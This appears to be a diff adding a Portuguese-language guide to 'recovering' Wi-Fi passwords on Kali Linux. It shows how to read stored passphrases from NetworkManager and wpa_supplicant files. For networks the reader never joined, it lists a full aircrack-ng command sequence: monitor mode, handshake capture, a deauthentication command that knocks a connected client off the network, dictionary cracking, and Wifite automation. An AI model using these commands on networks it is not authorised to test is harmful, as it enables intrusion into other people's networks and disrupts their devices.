@@ -1,0 +1,44 @@
+--- se você já esteve conectado à rede ---
+
+Abra o terminal no Kali Linux.
+
+Digite o seguinte comando e pressione Enter: iwconfig
+
+Procure pela sua interface de rede sem fio (geralmente algo como wlan0). Anote o ESSID (nome da rede) da conexão ativa ou da rede que você quer recuperar a senha.
+
+Depois de identificar a interface e o ESSID, você pode tentar encontrar a senha nos arquivos de configuração do sistema. O local exato pode variar dependendo da sua configuração, mas geralmente você pode procurar nos seguintes arquivos:
+
+/etc/NetworkManager/system-connections/: Dentro desta pasta, você deve encontrar arquivos com o nome da sua rede Wi-Fi. Abra o arquivo correspondente com um editor de texto (como o nano) e procure por linhas como psk= ou key_mgmt=WPA-PSK. O valor após psk= é a senha da rede.
+
+sudo nano /etc/NetworkManager/system-connections/"NOME_DA_SUA_REDE"
+
+(Substitua "NOME_DA_SUA_REDE" pelo nome real da sua rede).
+
+/etc/wpa_supplicant/wpa_supplicant.conf: Este arquivo também pode conter informações sobre redes Wi-Fi salvas.
+
+sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
+
+-- se você não se conectou antes ou o método acima não funcionar -- 
+
+Aircrack-ng suite: Esta é uma coleção de ferramentas poderosas para auditoria de redes sem fio. O processo geralmente envolve:
+
+Colocar sua interface de rede em modo monitor.
+Escanear as redes Wi-Fi ao redor.
+Capturar o handshake da rede alvo.
+Usar uma ferramenta como aircrack-ng com um dicionário de senhas para tentar quebrar a senha.
+
+sudo airmon-ng start wlan0  # Coloca a interface wlan0 em modo monitor (pode ser diferente, como wlx...)
+sudo airodump-ng wlan0mon   # Lista as redes Wi-Fi e seus clientes
+sudo airodump-ng --bssid <BSSID_DA_REDE> -c <CANAL_DA_REDE> -w captura wlan0mon # Captura o handshake
+sudo aireplay-ng -0 2 -a <BSSID_DA_REDE> -c <MAC_DO_CLIENTE> wlan0mon # Desautentica um cliente para forçar o handshake (opcional)
+sudo aircrack-ng -w <CAMINHO_PARA_O_DICIONARIO> captura-01.cap # Tenta quebrar a senha usando o dicionário
+sudo airmon-ng stop wlan0mon # Desativa o modo monitor
+
+Substitua <BSSID_DA_REDE> pelo endereço MAC do roteador da sua rede.
+Substitua <CANAL_DA_REDE> pelo canal em que a rede está transmitindo.
+Substitua <MAC_DO_CLIENTE> pelo endereço MAC de um dispositivo conectado à rede (você pode encontrar isso na saída do airodump-ng).
+Substitua <CAMINHO_PARA_O_DICIONARIO> pelo caminho para um arquivo de texto contendo uma lista de possíveis senhas.
+
+Wifite2: Esta é uma ferramenta que automatiza muitos dos passos do Aircrack-ng, tornando o processo mais fácil para iniciantes.
+
+sudo wifite
